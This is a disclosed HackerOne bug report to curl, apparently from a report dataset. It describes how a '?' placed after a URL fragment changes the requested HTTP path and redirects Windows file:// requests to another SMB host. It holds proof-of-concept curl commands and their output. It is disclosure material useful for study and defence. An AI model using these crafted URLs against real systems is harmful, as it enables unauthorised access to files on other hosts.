---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '726117'
original_report_id: '726117'
title: SMB access smuggling via FILE URL on Windows
weakness: Improper Input Validation
team_handle: curl
created_at: '2019-10-31T06:08:59.735Z'
disclosed_at: '2021-01-17T23:12:26.127Z'
has_bounty: true
visibility: full
substate: not-applicable
vote_count: 9
asset_identifier: https://github.com/curl/curl
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- improper-input-validation
---

# SMB access smuggling via FILE URL on Windows

## Metadata

- HackerOne Report ID: 726117
- Weakness: Improper Input Validation
- Program: curl
- Disclosed At: 2021-01-17T23:12:26.127Z
- Has Bounty: Yes
- Visibility: full
- Substate: not-applicable

## Original Report

## Summary:

While CURL 7.62 > parses URLs that have an ? (parameter separator) char after the # (fragment separator), CURL urlapi code treats the path with the hash part as it being the same one, this may allow some problem on specific protocols that may have a security impact.
On HTTP, an attacker may be able to modify original requests by appending "?" to the fragment part of the URL, see first example.
On FILE, CURL can be confused while requesting FILE urls to get a file from a different server that the user intended on Windows as the FILE protocol on Windows supports SMB. 

## Steps To Reproduce:
HTTP Example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /safepath/something HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /anotherpath/somethingelse? HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>
```

File example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1


fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0   2750      0 --:--:-- --:--:-- --:--:--  2750
file on different smb server/path
```

## Impact

Modify expected request behavior  on several protocols

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
